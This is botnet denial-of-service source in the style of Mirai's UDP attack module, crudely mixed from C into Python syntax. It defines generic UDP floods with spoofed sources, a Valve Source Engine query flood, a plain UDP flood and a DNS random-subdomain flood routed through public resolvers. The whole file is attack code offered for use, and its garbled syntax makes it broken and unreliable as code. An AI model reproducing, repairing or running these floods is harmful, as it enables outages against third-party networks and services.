import os
_GNU_SOURCE	= #ifdef DEBUG
import sys
#endif
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <errno.h>
#include <fcntl.h>

#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"
#include "util.h"
#include "table.h"
#include "protocol.h"

static ipv4_t get_dns_resolver(void)

def attack_udp_generic(targs_len, struct attack_target *targs, opts_len, struct attack_option *opts):
    pkts = calloc(targs_len; sizeof ())
    ip_tos = attack_get_opt_int(opts_len; 0)
    ip_ident = attack_get_opt_int(opts_len; 0xffff)
    ip_ttl = attack_get_opt_int(opts_len; 64)
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, False)
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff)
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff)
    data_len = attack_get_opt_int(opts_len; 512)
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, True)
    source_ip = attack_get_opt_int(opts_len; LOCAL_ADDR)

    if data_len > 1460:
        data_len = 1460

    if (fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1:
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n")
#endif
        return
    i = 1
    if setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1:
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n")
#endif
        os.close(fd)
        return

    for i in range(targs_len):
        struct iphdr *iph
        struct udphdr *udph

        pkts[i] = calloc(1510, sizeof (char))
        iph = (struct iphdr *)pkts[i]
        udph = (struct udphdr *)(iph + 1)

        iph.version = 4
        iph.ihl = 5
        iph.tos = ip_tos
        iph.tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + data_len)
        iph.id = htons(ip_ident)
        iph.ttl = ip_ttl
        if dont_frag:
            iph.frag_off = htons(1 << 14)
        iph.protocol = IPPROTO_UDP
        iph.saddr = source_ip
        iph.daddr = targs[i].addr

        udph.source = htons(sport)
        udph.dest = htons(dport)
        udph.len = htons(sizeof (struct udphdr) + data_len)

    while True:
        for i in range(targs_len):
            pkt = pkts[i]
            struct iphdr *iph = (struct iphdr *)pkt
            struct udphdr *udph = (struct udphdr *)(iph + 1)
            data = ()(udph + 1)

            # For prefix attacks
            if targs[i].netmask < 32:
                iph.daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask))

            if source_ip == 0xffffffff:
                iph.saddr = rand_next()

            if ip_ident == 0xffff:
                iph.id = (uint16_t)rand_next()
            if sport == 0xffff:
                udph.source = rand_next()
            if dport == 0xffff:
                udph.dest = rand_next()

            # Randomize packet content?
            if data_rand:
                rand_str(data, data_len)

            iph.check = 0
            iph.check = checksum_generic(()iph, sizeof (struct iphdr))

            udph.check = 0
            udph.check = checksum_tcpudp(iph, udph, udph.len, sizeof (struct udphdr) + data_len)

            targs[i].sock_addr.sin_port = udph.dest
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in))
#ifdef DEBUG
            break
            if errno != 0:
                printf("errno = %d\n" % (errno))
#endif

def attack_udp_vse(targs_len, struct attack_target *targs, opts_len, struct attack_option *opts):
    pkts = calloc(targs_len; sizeof ())
    ip_tos = attack_get_opt_int(opts_len; 0)
    ip_ident = attack_get_opt_int(opts_len; 0xffff)
    ip_ttl = attack_get_opt_int(opts_len; 64)
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, False)
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff)
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 27015)

    table_unlock_val(TABLE_ATK_VSE)
    vse_payload = table_retrieve_val(TABLE_ATK_VSE, &vse_payload_len)

    if (fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1:
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n")
#endif
        return
    i = 1
    if setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1:
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n")
#endif
        os.close(fd)
        return

    for i in range(targs_len):
        struct iphdr *iph
        struct udphdr *udph

        pkts[i] = calloc(128, sizeof (char))
        iph = (struct iphdr *)pkts[i]
        udph = (struct udphdr *)(iph + 1)
        data = ()(udph + 1)

        iph.version = 4
        iph.ihl = 5
        iph.tos = ip_tos
        iph.tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len)
        iph.id = htons(ip_ident)
        iph.ttl = ip_ttl
        if dont_frag:
            iph.frag_off = htons(1 << 14)
        iph.protocol = IPPROTO_UDP
        iph.saddr = LOCAL_ADDR
        iph.daddr = targs[i].addr

        udph.source = htons(sport)
        udph.dest = htons(dport)
        udph.len = htons(sizeof (struct udphdr) + 4 + vse_payload_len)

        *(()data) = 0xffffffff
        data += sizeof (uint32_t)
        util_memcpy(data, vse_payload, vse_payload_len)

    while True:
        for i in range(targs_len):
            pkt = pkts[i]
            struct iphdr *iph = (struct iphdr *)pkt
            struct udphdr *udph = (struct udphdr *)(iph + 1)
            
            # For prefix attacks
            if targs[i].netmask < 32:
                iph.daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask))

            if ip_ident == 0xffff:
                iph.id = (uint16_t)rand_next()
            if sport == 0xffff:
                udph.source = rand_next()
            if dport == 0xffff:
                udph.dest = rand_next()

            iph.check = 0
            iph.check = checksum_generic(()iph, sizeof (struct iphdr))

            udph.check = 0
            udph.check = checksum_tcpudp(iph, udph, udph.len, sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len)

            targs[i].sock_addr.sin_port = udph.dest
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in))
#ifdef DEBUG
            break
            if errno != 0:
                printf("errno = %d\n" % (errno))
#endif

def attack_udp_dns(targs_len, struct attack_target *targs, opts_len, struct attack_option *opts):
    pkts = calloc(targs_len; sizeof ())
    ip_tos = attack_get_opt_int(opts_len; 0)
    ip_ident = attack_get_opt_int(opts_len; 0xffff)
    ip_ttl = attack_get_opt_int(opts_len; 64)
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, False)
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff)
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 53)
    dns_hdr_id = attack_get_opt_int(opts_len; 0xffff)
    data_len = attack_get_opt_int(opts_len; 12)
    domain = attack_get_opt_str(opts_len; NULL)
    ipv4_t dns_resolver = get_dns_resolver()

    if domain == NULL:
#ifdef DEBUG
        printf("Cannot send DNS flood without a domain\n")
#endif
        return
    domain_len = util_strlen(domain)

    if (fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1:
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n")
#endif
        return
    i = 1
    if setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1:
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n")
#endif
        os.close(fd)
        return

    for i in range(targs_len):
        curr_word_len = 0; num_words = 0
        struct iphdr *iph
        struct udphdr *udph
        struct dnshdr *dnsh
        struct dns_question *dnst

        pkts[i] = calloc(600, sizeof (char))
        iph = (struct iphdr *)pkts[i]
        udph = (struct udphdr *)(iph + 1)
        dnsh = (struct dnshdr *)(udph + 1)
        qname = ()(dnsh + 1)

        iph.version = 4
        iph.ihl = 5
        iph.tos = ip_tos
        iph.tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question))
        iph.id = htons(ip_ident)
        iph.ttl = ip_ttl
        if dont_frag:
            iph.frag_off = htons(1 << 14)
        iph.protocol = IPPROTO_UDP
        iph.saddr = LOCAL_ADDR
        iph.daddr = dns_resolver

        udph.source = htons(sport)
        udph.dest = htons(dport)
        udph.len = htons(sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question))

        dnsh.id = htons(dns_hdr_id)
        dnsh.opts = htons(1 << 8) # Recursion desired
        dnsh.qdcount = htons(1)

        # Fill out random area
        *qname++ = data_len
        qname += data_len

        curr_lbl = qname
        util_memcpy(qname + 1, domain, domain_len + 1) # Null byte at end needed

        # Write in domain
        for ii in range(domain_len):
            if domain[ii] == '.':
                *curr_lbl = curr_word_len
                curr_word_len = 0
                num_words += 1
                curr_lbl = qname + ii + 1
            else:
                curr_word_len += 1
        *curr_lbl = curr_word_len

        dnst = (struct dns_question *)(qname + domain_len + 2)
        dnst.qtype = htons(PROTO_DNS_QTYPE_A)
        dnst.qclass = htons(PROTO_DNS_QCLASS_IP)

    while True:
        for i in range(targs_len):
            pkt = pkts[i]
            struct iphdr *iph = (struct iphdr *)pkt
            struct udphdr *udph = (struct udphdr *)(iph + 1)
            struct dnshdr *dnsh = (struct dnshdr *)(udph + 1)
            qrand = (()(dnsh + 1)) + 1

            if ip_ident == 0xffff:
                iph.id = rand_next() & 0xffff
            if sport == 0xffff:
                udph.source = rand_next() & 0xffff
            if dport == 0xffff:
                udph.dest = rand_next() & 0xffff

            if dns_hdr_id == 0xffff:
                dnsh.id = rand_next() & 0xffff

            rand_alphastr(()qrand, data_len)

            iph.check = 0
            iph.check = checksum_generic(()iph, sizeof (struct iphdr))

            udph.check = 0
            udph.check = checksum_tcpudp(iph, udph, udph.len, sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question))

            targs[i].sock_addr.sin_addr.s_addr = dns_resolver
            targs[i].sock_addr.sin_port = udph.dest
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in))
#ifdef DEBUG
            break
            if errno != 0:
                printf("errno = %d\n" % (errno))
#endif

def attack_udp_plain(targs_len, struct attack_target *targs, opts_len, struct attack_option *opts):
#ifdef DEBUG
    printf("in udp plain\n")
#endif

    pkts = calloc(targs_len; sizeof ())
    fds = calloc(targs_len; sizeof (int))
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff)
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff)
    data_len = attack_get_opt_int(opts_len; 512)
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, True)
    struct sockaddr_in bind_addr = {0}

    if sport == 0xffff:
        sport = rand_next()
    else:
        sport = htons(sport)

#ifdef DEBUG
    printf("after args\n")
#endif

    for i in range(targs_len):
        struct iphdr *iph
        struct udphdr *udph

        pkts[i] = calloc(65535, sizeof (char))

        if dport == 0xffff:
            targs[i].sock_addr.sin_port = rand_next()
        else:
            targs[i].sock_addr.sin_port = htons(dport)

        if (fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1:
#ifdef DEBUG
            printf("Failed to create udp socket. Aborting attack\n")
#endif
            return

        bind_addr.sin_family = AF_INET
        bind_addr.sin_port = sport
        bind_addr.sin_addr.s_addr = 0

        if bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1:
#ifdef DEBUG
            printf("Failed to bind udp socket.\n")
#endif

        # For prefix attacks
        if targs[i].netmask < 32:
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask))

        if connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1:
#ifdef DEBUG
            printf("Failed to connect udp socket.\n")
#endif

#ifdef DEBUG
    printf("after setup\n")
#endif

    while True:
        for i in range(targs_len):
            data = pkts[i]

            # Randomize packet content?
            if data_rand:
                rand_str(data, data_len)

#ifdef DEBUG
            errno = 0
            if send(fds[i], data, data_len, MSG_NOSIGNAL) == -1:
                printf("send failed: %d\n" % (errno))
            else:
                printf(".\n")
#else
            send(fds[i], data, data_len, MSG_NOSIGNAL)
#endif
#ifdef DEBUG
            break
            if errno != 0:
                printf("errno = %d\n" % (errno))
#endif

static ipv4_t get_dns_resolver(void)

    table_unlock_val(TABLE_ATK_RESOLVER)
    fd = os.open(table_retrieve_val(TABLE_ATK_RESOLVER, NULL), os.O_RDONLY)
    table_lock_val(TABLE_ATK_RESOLVER)
    if fd >= 0:

        ret = os.read(fd, resolvbuf, sizeof (resolvbuf))
        os.close(fd)
        table_unlock_val(TABLE_ATK_NSERV)
        nspos = util_stristr(resolvbuf, ret, table_retrieve_val(TABLE_ATK_NSERV, NULL))
        table_lock_val(TABLE_ATK_NSERV)
        if nspos != -1:
            BOOL finished_whitespace = False
            BOOL found = False

            for i in range(nspos, ret):
                c = resolvbuf[i]

                # Skip leading whitespace
                if not finished_whitespace:
                    if c == ' ' or c == '\t':
                        continue
                    else:
                        finished_whitespace = True

                # End if c is not either a dot or a number
                if (c != '.' and (c < '0' or c > '9')) or (i == (ret - 1)):
                    util_memcpy(ipbuf, resolvbuf + nspos, i - nspos)
                    ipbuf[i - nspos] = 0
                    found = True
                    break

            if found:
#ifdef DEBUG
                printf("Found local resolver: '%s'\n" % (ipbuf))
#endif
                return inet_addr(ipbuf)

    switch rand_next() % 4:
    case 0:
        return INET_ADDR(8,8,8,8)
    case 1:
        return INET_ADDR(74,82,42,42)
    case 2:
        return INET_ADDR(64,6,64,6)
    case 3:
        return INET_ADDR(4,2,2,2)
